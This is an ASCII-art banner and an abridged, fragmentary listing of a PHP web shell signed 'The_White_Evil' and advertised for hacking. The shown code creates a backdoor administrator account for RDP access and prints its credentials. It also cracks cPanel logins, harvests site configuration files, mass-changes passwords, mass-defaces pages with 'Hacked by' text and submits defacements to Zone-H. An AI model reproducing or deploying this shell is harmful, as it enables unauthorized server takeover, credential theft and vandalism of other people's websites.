                                                                      .::.     'xXWWMMMMMW0d:..',.           ......   .,,..                                 .:.                                                             
                                                                     .c;     .oXWWMMMMMMMNc     .'.                  .'.                                     .l'                                                            
                                                                     cl.    ,kWMMMMMMMMMMWx.      ..               .;'                                        ,o'                                                           
                                                                 .:lll.    ,0WMMMMMMMMMMMMXc       ....         .;lc.                                          oo.                                                          
                                                                  .l0l    'OWMMMMMMMMMMMMMMO'        ..'',,,;:ccll,                                            ck,                                                          
                                                                    ,d;  .dWMMMMMMMMMMMMMMMWo           ..','...                                               :0;                                                          
                                                          .,:,       'l, 'xKKKKKKKKKKKKKKKKKd.         ..,:'                                                   cO,                                                          
                                                        .,....       .'.  ...................         ''....                                                   .'                                                           
                                                       ;o.          ...    .:.                      .cc.                       .:.                                                                                          
                                     .                .xc   .             .o0:.       ..            ;k;  ..           ...     .l0:.                                                                                         
                                   .:do.   :,   co.   cO,.'ckl.   .;oc.   ,OO;'.    ':cxd.         .dk..,ok:       .,;cxk;    ,OO;..                                                                                        
                                   . ,kl  .Ox. .ol   .dk,'.'kx.   .lXl    'kl     .co'.d0,         .kd'..;0o     .::. .x0,    'Ol                                                                                           
                                     .dk. .oO' ':.   'O0;  'Oo     c0,    :O;     lk;.:d:          ;Kx'  :0;    .ox.  ;Kk.    :0;                                                                                           
                                      ok'  :O;.'     :Kd.  :0;    .dk.   .dk.    '0O;,,.           oKc   dk.    cKc  'kNo     dk.                                                                                           
                                      cO;  ;0l.      dO'  .dO.    'Oo    .Od     ;Kd.             .kd.  .kd    .xK;.;:o0:    .kd                                                                                            
                                      :x'  ,x:      .xo.  .xO;.   ,Oo..  .kk,.   .oOc,...         ;O:   'Ox..   lKkl;.c0c..  .kk,.                                                                                          
                                      ..    .        ..    .,.     ''.    .,.      .,'.           ...    ''.    .,,.  .'.     .,.                                                                                           
                                                                                                                                                                                                                            
                                                                                                                                                                                                                 
                                                                                                                                                                                                                            
                       .ldddddddl,:d;                        .lo'  .ldo'  'ol';d:.      'ol.  ''.                    .cdddddddl.          ;d: .ld'                    ;dc. .ld,  ,dl.                                       
                       .:co0W0oc:;kWo....      ..            .kWd. oNWWx. oWk'oWk....   .c:..lXO;    ...             .OWOlcccc;. ..    .. 'c; '0Nc                    oW0' ,KWo  oW0'                                       
                          .xWx.  .kW0ddk0l. 'dkddkd'          :XK,,0XOXX;'0Nc.oWKddkOd. ;0k';0WXx,.lkxdkx,           .OWx,''''. :Ox' .o0l.lKd.'0Nc                    lWO. .ONc  cNO.                                       
                          .xMx.  .kWO,.cXK;.OW0cl0WO.         .kNxxNx'dWxdNO..dWK:.;0Nc cNK, oWO'.dWKockNK;          .OWXOOOOOl..xNd.cXO'.dWk.'0Nc                    :Xx. .xK;  ;Xx.                                       
                          .xWx.  .kWo  ,KX:,KWkllll:.          cNNWX; ;XNNNl  oWk. .kWo :NK, oWO..kW0olllc'          .OWo.....   'OXOKK: .dWk.'0Nc                    .o;   :o.  .o;                                        
                          .xMx.  .kWo  ,KX:.lK0ocoo,           .kWWd. .xWWO'  dWk. .OWl cNK, cNKd;:0Kdcod;           .OWKxddddo'  ;KWNl  .xMk.'0Nc .oo. :d: .lo' ,dl. ;xc. .ld,  ;dl.                                       
                           ,c,    ,c'  .::.  .:cc:;.            'c:.   .:c'   'c,   ,c. .c;. .;cc' .;ccc;.           .;ccccccc:.   ,c;.   'c, .;:. .::. ,c, .;:. .c;. 'c;. .;:.  'c;.                                       
                                                    :doddddddc.                                           .ldoodddddo'                                                                                                      
                                                    ..........                                             .'...''...                                                                                                       
...
<!--
###############################################################################
// Hi, I am The_White_Evil(alias) Penetration Tester, Ethical Hacker :) If you are looking for a perfect shell, then don't lose your time just give it a try with my shell. 
###############################################################################
//Happy Hacking!!!
###############################################################################
-->
<head>
<title>The_White_Evil</title>
<meta name='author' content='The_White_Evil'>
<meta charset="UTF-8">
<style type='text/css'>
...
<?php
  ...
  elseif($toolsname === "krdp") {
    ...
    if(preg_match("/The_White_Evil/", exe("net user"))) die(color(1, 1, "[INFO] username 'The_White_Evil' already exists."));

    $add_user   = exe("net user The_White_Evil The_White_Evil /add");
      $add_groups1 = exe("net localgroup Administrators The_White_Evil /add");
      $add_groups2 = exe("net localgroup Administrator The_White_Evil /add");
      $add_groups3 = exe("net localgroup Administrateur The_White_Evil /add");

      print "[ RDP ACCOUNT INFO ]<br>
      ------------------------------<br>
      IP: ".color(1, 2, $GLOBALS['SERVERIP'])."<br>
      Username: ".color(1, 2, "The_White_Evil")."<br>
      Password: ".color(1, 2, "The_White_Evil")."<br>
      ------------------------------<br><br>
      [ STATUS ]<br>
      ------------------------------<br>
      ";
...
function files_and_folder() {
  ...
  print "</table>";
  print "<center>Copyright &copy; ".date("Y")." - <a href='https://www.github.com/thewhiteevil/' target='_blank'>".color(1, 2, "The_White_Evil")."</a></center>";
}
  ...
  if(isset($_GET['do'])) {
    ...
    elseif($_GET['do'] === "config") {
      ...
      if(!is_dir(path()."/idx_config/")) {
        ...
        $htaccess = "Options all\nDirectoryIndex The_White_Evil.htm\nSatisfy Any";
    ...
    elseif($_GET['do'] === "zoneh") {
      if(isset($_POST['submit']) AND $_GET['do'] === "zoneh") {
        ...
        print "<center><form method='post' action='?do=zoneh&dir=".path()."'>
                 Defacer: <br>
                 <input type='text' name='nick' size='50' value='The_White_Evil'><br><br>
                 Domains: <br>
    ...
    elseif($_GET['do'] == 'cpanel') {
      if($_POST['crack']) {
        ...
        print ($i === 0) ? "" : "<p>".color(1, 3, "Sukses nyolong $i Cpanel by The_White_Evil")."</p>";
      } else {
        print "<center>
    ...
    elseif($_GET['do'] == 'mpc') {
      if($_POST['hajar']) {
        ...
        Set User & Pass: <br>
        <input type='text' name='user_baru' value='The_White_Evil' placeholder='user_baru'><br>
        <input type='text' name='pass_baru' value='The_White_Evil' placeholder='pass_baru'><br>
    ...
    elseif($_GET['do'] === "mass") {
      if($_POST['start']) {
        ...
        print "<center><form method='post'>
             ...
             <textarea name='script' style='width: 450px; height: 200px;'>Hacked by The_White_Evil</textarea><br>
